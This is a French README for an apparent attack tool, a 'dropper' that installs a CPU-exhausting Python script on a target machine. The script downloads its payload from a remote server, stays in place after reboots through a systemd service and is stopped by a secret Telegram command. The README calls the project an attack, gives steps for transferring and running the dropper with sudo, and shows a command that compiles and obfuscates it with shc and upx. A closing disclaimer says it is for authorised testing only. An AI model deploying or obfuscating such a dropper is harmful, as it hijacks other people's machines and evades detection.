# GPT-4 Ultra Calculator + Telegram Bot

Ce projet consiste en un script Python qui exécute un grand nombre de calculs complexes générés par GPT-4, en utilisant `multiprocessing` pour exploiter tous les cœurs du processeur. Le script peut être contrôlé par un bot Telegram, qui permet d’arrêter les calculs via une commande secrète. Le projet assure aussi la persistance même après redémarrage grâce à un service `systemd`.

---

## Composants du projet

### 1. `main.py`
Le fichier principal exécutant les calculs complexes et gérant la communication avec le bot Telegram.

### 2. `install_dropper.sh`
Le script Bash permettant d’installer et de configurer automatiquement le système, y compris le téléchargement du script Python, l’installation des dépendances, et la configuration d’un service `systemd` pour garantir que tout fonctionne même après un redémarrage.

---
# dotenv var

```bash
OPENAI_API_KEY=
TELEGRAM_TOKEN=
USER_ID=
MAGIC_COMMAND=
```

---

## 1. Fichier `main.py`

### Fonctionnalités principales :
- **Calculs massifs** : Le script génère des expressions mathématiques complexes à l’aide de GPT-4 et les évalue de manière répétée. Cela permet de maximiser l'utilisation du processeur.
- **Multithreading** : Utilisation de `multiprocessing` pour créer plusieurs processus d'exécution qui effectuent les calculs simultanément, en tirant parti des ressources CPU disponibles.
- **Commandes Telegram** : Un bot Telegram permet de contrôler l'exécution des calculs. La commande secrète `/stop_calc_trhacknon` arrête tous les processus et le service `systemd` associé.
- **Persistance via systemd** : Le script est configuré pour être relancé automatiquement après un redémarrage grâce à un service `systemd`.

### Détails du script `main.py` :
1. **Téléchargement des expressions** : Le script utilise GPT-4 pour générer des expressions mathématiques complexes.
2. **Exécution parallèle** : Les calculs sont exécutés dans plusieurs processus en parallèle, chacun évaluant une expression générée.
3. **Communication avec Telegram** : Le script écoute les messages Telegram et permet à un utilisateur autorisé (identifié par son `user_id`) d'envoyer la commande `/stop_calc_trhacknon` pour stopper les calculs.
4. **Persistance via systemd** : Le script est configuré pour être relancé automatiquement après un redémarrage grâce à un service `systemd`.

---

## 2. Fichier `install_dropper.sh`

Le fichier `install_dropper.sh` est un script Bash permettant d'installer et de configurer tout le nécessaire pour faire fonctionner le projet sur une machine cible. Il installe le script Python (`main.py`), les dépendances nécessaires, configure un service `systemd`, et assure que tout est prêt pour être lancé au démarrage de la machine.

### Fonctionnalités principales :
- **Installation des dépendances** : Le script installe toutes les dépendances nécessaires, comme Python, les bibliothèques `openai` et `pyTelegramBotAPI`.
- **Téléchargement du script Python** : Le script télécharge le fichier `main.py` depuis un serveur distant (indiqué dans le script), le rend exécutable, et le place dans le répertoire approprié.
- **Configuration du service systemd** : Le script configure un service `systemd` pour que le script Python soit lancé automatiquement au démarrage de la machine. Cela garantit la persistance du processus de calcul même après un redémarrage.
- **Installation des clés API** : Le script prend en charge l’installation des variables d’environnement, notamment la clé API de GPT-4 et le token Telegram.

---

## Instructions d’utilisation

### 1. Exécuter le script `dropper.sh` sur la machine cible :
Ce script doit être exécuté sur une machine cible pour installer et configurer l'attaque.

```bash
chmod +x dropper.sh
sudo ./dropper.sh
```

2. Vérification :

Après l'exécution du script, le service gpt4_calc.service sera activé et lancé automatiquement. Le script sera maintenant en cours d'exécution et le bot Telegram sera opérationnel.


---

Commandes Telegram

Le bot Telegram peut être contrôlé à l’aide de la commande secrète /stop_calc_trhacknon.

Commandes disponibles :

/stop_calc_trhacknon : Cette commande permet d’arrêter tous les processus de calculs, de désactiver le service et de tuer le processus associé. Elle est réservée à l'utilisateur autorisé spécifié dans le script.



---

Exemples d’utilisation

Installation sur la machine cible :

1. Transfert du dropper.sh sur la machine cible : Utilisez scp ou tout autre outil pour transférer le fichier dropper.sh sur la machine cible.


2. Exécution du script : Une fois le script transféré, rendez-le exécutable et exécutez-le :



chmod +x dropper.sh
sudo ./dropper.sh

3. Vérification du service systemd : Vérifiez si le service gpt4_calc.service fonctionne correctement avec la commande suivante :



sudo systemctl status gpt4_calc.service

4. Commandes Telegram : Le bot Telegram sera prêt à recevoir des commandes. Envoyez /stop_calc_trhacknon pour arrêter l'attaque.

---

### Compilation et Obfuscation du Script `dropper.sh`

Pour renforcer la confidentialité et la protection de votre script Bash `dropper.sh`, vous pouvez le compiler en binaire et l'obfusquer à l'aide de deux outils : `shc` et `upx`.

La commande suivante combine les deux étapes en une seule ligne :

```bash
shc -f dropper.sh -o dropper && upx --best --lzma dropper
```

---

Notes de sécurité

Ce projet est à utiliser uniquement dans un environnement de test contrôlé et avec l'autorisation appropriée. Il est conçu pour des fins d’apprentissage et de démonstration uniquement.
Ne l'utilisez pas à des fins malveillantes.
Assurez-vous de respecter les lois et réglementations locales lors de l'utilisation de ce projet.


---

Auteurs

Nom du développeur : trhacknon

Projet : GPT-4 Ultra Calculator + Telegram Bot
